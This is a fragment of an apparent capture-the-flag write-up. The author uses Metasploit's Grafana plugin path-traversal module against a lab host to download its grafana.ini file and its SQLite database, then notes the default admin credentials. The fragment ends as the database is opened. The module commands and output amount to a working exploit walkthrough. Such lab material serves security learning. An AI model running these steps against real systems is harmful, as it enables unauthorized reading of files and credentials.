...
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > how options
[-] Unknown command: how
...
Module options (auxiliary/scanner/http/grafana_plugin_traversal):
   ...
   PLUGINS_FILE  /usr/share/metasploit-framework/data/wordlists/grafana_plugins.txt  yes       File containing plugins to enumerate
...
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > set RHOSTS 10.10.11.183
RHOSTS => 10.10.11.183
...
[+] 10.10.11.183:3000 - File saved in: /home/kali/.msf4/loot/20221218125411_default_10.10.11.183_grafana.loot_658565.ini
...
1) Now I read the file just find: 
```
──(kali㉿kali)-[~/.msf4/loot]
└─$ cat 20221218125411_default_10.10.11.183_grafana.loot_658565.ini
...
2) Now I discover two things, one is default credentials:
```
# default admin user, created on startup
;admin_user = admin
...
3) The Second thing is how I can access in the database:
```
# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
...
4) Then I use even metasploit, but this time I change the filepath:
```
...
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > exploit

[+] Detected vulnerable Grafina: 8.2.0
[*] 10.10.11.183 - Progress   0/40 (0.0%)
[+] alertlist was found and exploited successfully
[+] 10.10.11.183:3000 - File saved in: /home/kali/.msf4/loot/20221218131605_default_10.10.11.183_grafana.loot_296277.db
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

5) I open this file with this app "SQlite database browser", I check the data_source's table:
